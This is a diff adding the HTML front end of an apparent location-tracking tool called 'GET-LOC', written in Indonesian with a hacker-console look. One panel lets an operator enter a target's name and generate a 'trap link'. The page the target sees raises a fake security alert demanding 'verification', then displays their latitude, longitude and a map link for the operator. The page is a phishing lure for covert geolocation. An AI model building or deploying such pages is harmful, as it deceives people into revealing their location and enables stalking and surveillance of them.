@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonymous</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="scanlines"></div>
+    
+    <div class="interface-wrapper">
+        
+        <div class="sys-header">
+            <span>SYSTEM: <span class="blink">ONLINE</span></span>
+            <span>ENCRYPTION: D4 TRK-1A</span>
+            <span>USER: Anonymous</span>
+        </div>
+
+        <div id="admin-panel" class="panel-box">
+            <h1 class="logo-text">GET-LOC <span>v1.0</span></h1>
+            
+            <div class="console-log">
+                <p>> PROGRAM SEDANG BERJALAN...</p>
+                <p>> MENUNGGU IDENTITAS TARGET...</p>
+            </div>
+
+            <div class="input-group">
+                <label>>> MASUKKAN NAMA TARGET:</label>
+                <input type="text" id="target-input" placeholder="_" autocomplete="off">
+            </div>
+
+            <button id="generate-btn" class="hacker-btn">
+                [ GENERATE TRAP LINK ]
+            </button>
+
+            <div id="link-result" class="hidden result-area">
+                <p class="success-msg">>> LINK BERHASIL DIBUAT</p>
+                <div class="link-display">
+                    <span id="generated-link"></span>
+                </div>
+                <button onclick="copyLink()" class="hacker-btn sm-btn">[ COPY LINK ]</button>
+            </div>
+        </div>
+
+        <div id="target-panel" class="panel-box hidden">
+            <h1 class="logo-text error-mode">KEAMANAN_SISTEM!!!</h1>
+            
+            <div class="target-identity">
+                SUBJECT: <span id="display-target-id">UNKNOWN</span>
+            </div>
+
+            <div class="console-log">
+                <p class="warn">> AKTIVITAS TIDAK BIASA TERDETEKSI.</p>
+                <p class="warn">> VERIFIKASI IDENTITAS DIPERLUKAN!!.</p>
+                <p class="warn">> MENUNGGU VERIFIKASI...</p>
+            </div>
+
+            <div id="action-area">
+                <button id="track-btn" class="hacker-btn alert-btn">
+                    [ VERIFIKASI SUPAYA AMAN ]
+                </button>
+            </div>
+
+            <div id="result-panel" class="hidden">
+                <div class="map-border">
+                    <div id="map"></div>
+                    <div class="radar-scan"></div>
+                </div>
+
+                <div class="coords-display">
+                    <div>LAT: <span id="lat">--</span></div>
+                    <div>LNG: <span id="long">--</span></div>
+                </div>
+
+                <div class="status-bar">
+                    <span class="overlay-text">SEARCHING...</span>
+                </div>
+
+                <a id="gmaps-force-link" href="#" target="_blank" class="hacker-btn map-btn">
+                    [ BUKA LOKASI TARGET ]
+                </a>
+            </div>
+            
+            <div id="error-msg" class="hidden error-box"></div>
+        </div>
+
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
